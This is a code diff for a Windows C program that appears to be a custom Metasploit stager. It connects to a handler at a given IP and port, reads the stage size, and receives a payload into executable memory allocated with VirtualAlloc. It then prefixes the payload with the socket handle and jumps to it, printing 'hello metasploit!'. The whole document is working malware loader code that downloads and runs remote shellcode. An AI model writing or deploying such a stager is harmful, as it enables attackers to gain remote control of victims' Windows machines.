@@ -1,15 +1,22 @@
+#include <winsock2.h>
 #include <Windows.h>
 #include <stdio.h>
+#pragma comment(lib, "Ws2_32.lib") // Better here than linker settings...
 
 int main(int argc, char *argv[])
 {
 	char *IP = argv[1];
 	char *iPort = argv[2];
-	int len = 0;
+	int len;
 	char* buff;
 	int count = 0;
 	WSADATA wsaData;
 	SOCKET SocketToHandler = INVALID_SOCKET;
+	
+	struct sockaddr_in handler;
+	handler.sin_addr.S_un.S_addr = inet_addr(argv[1]);
+	handler.sin_family = AF_INET;
+	handler.sin_port = htons(atoi(argv[2]));
 
 	int iResult;
 
@@ -23,54 +30,47 @@ int main(int argc, char *argv[])
 	}
 		
 	// Create a SOCKET for connecting to server
-	SocketToHandler = socket(result->ai_family, result->ai_socktype, result->ai_protocol);
+	SocketToHandler = socket(AF_INET, SOCK_STREAM, NULL);
 	if (SocketToHandler == INVALID_SOCKET) {
 		printf("socket failed with error: %ld\n", WSAGetLastError());
 		WSACleanup();
-		return INVALID_SOCKET;
+		exit(1);
 	}
 
 	// Connect to handler
-	iResult = connect(SocketToHandler, result->ai_addr, (int)result->ai_addrlen);
+	iResult = connect(SocketToHandler,(sockaddr *)&handler, sizeof(handler));
 	if (iResult == SOCKET_ERROR) {
+		printf("[-] Failed to connect ... will exit!\n");
 		closesocket(SocketToHandler);
-		return INVALID_SOCKET;
-	}
-	return SocketToHandler;
-	//////////////
-	sckt = get_socket(IP, iPort); // connect
-	if (sckt == INVALID_SOCKET) //Couldn't connect
-	{
-		dprintf(L"[-] Failed to connect ... will exit!\n");
 		exit(1);
 	}
-	dprintf(L"[+] Socket: %d\n", sckt);
 
-	dprintf(L"[*] Connecting \"%s:%s\"\n", IP, iPort);
+	printf("[+] Socket: %d\n", SocketToHandler);
 
-	count = recv(sckt, (char*)&len, 4, NULL); //read 4 bytes ... the first 4 bytes sent over from the handler are size of stage
+	printf("[*] Connecting \"%s:%s\"\n", IP, iPort);
+
+	count = recv(SocketToHandler, (char*)&len, 4, NULL); //read 4 bytes ... the first 4 bytes sent over from the handler are size of stage
 	if (count != 4 || len <= 0)
 	{
-		dprintf(L"[-] We connected, but something went wrong while receiving stage size ... will exit!\n");
+		printf("[-] We connected, but something went wrong while receiving stage size ... will exit!\n");
 		exit(1);
 	}
 
-	dprintf(L"[*] Stage length = \"%d\" bytes.\n", len);
+	printf("[*] Stage length = \"%d\" bytes.\n", len);
 	buff = (char*)VirtualAlloc(0, len + 5, MEM_COMMIT, PAGE_EXECUTE_READWRITE); //allocate
 	if (buff == NULL)
 	{
-		dprintf(L"[-] Failed to allocate memory! VirtualAlloc() returned : %08x\n", GetLastError());
+		printf("[-] Failed to allocate memory! VirtualAlloc() returned : %08x\n", GetLastError());
 		exit(1);
 	}
 
-	dprintf(L"[*] Success! \"%d\" bytes allocated.\n", (len + 5));
+	printf("[*] Success! \"%d\" bytes allocated.\n", (len + 5));
 	// Getting the stage
-	recv(sckt, buff + 5, len, MSG_WAITALL); // not specifying MSG_WAITALL caused me two days of headache ...
-	dprintf(L"[*] Setting EDI-to-be value:  0x%08x -> 0xBF\n", &buff);
+	recv(SocketToHandler, buff + 5, len, MSG_WAITALL); // not specifying MSG_WAITALL caused me two days of headache ...
+	printf("[*] Setting EDI-to-be value:  0x%08x -> 0xBF\n", &buff);
 	buff[0] = (char)0xBF;
-	dprintf(L"[*] Copying the socket address to the next 4 bytes...\n");
-	memcpy(buff + 1, &sckt, 4);
-	dprintf(L"[*] Detaching from console & calling the function, bye bye [ultimet], hello metasploit!\n");
+	printf("[*] Copying the socket address to the next 4 bytes...\n");
+	memcpy(buff + 1, &SocketToHandler, 4);
+	printf("[*] Detaching from console & calling the function, bye bye [ultimet], hello metasploit!\n");
 	(*(void(*)())buff)();//Bye bye ...
-}
 }
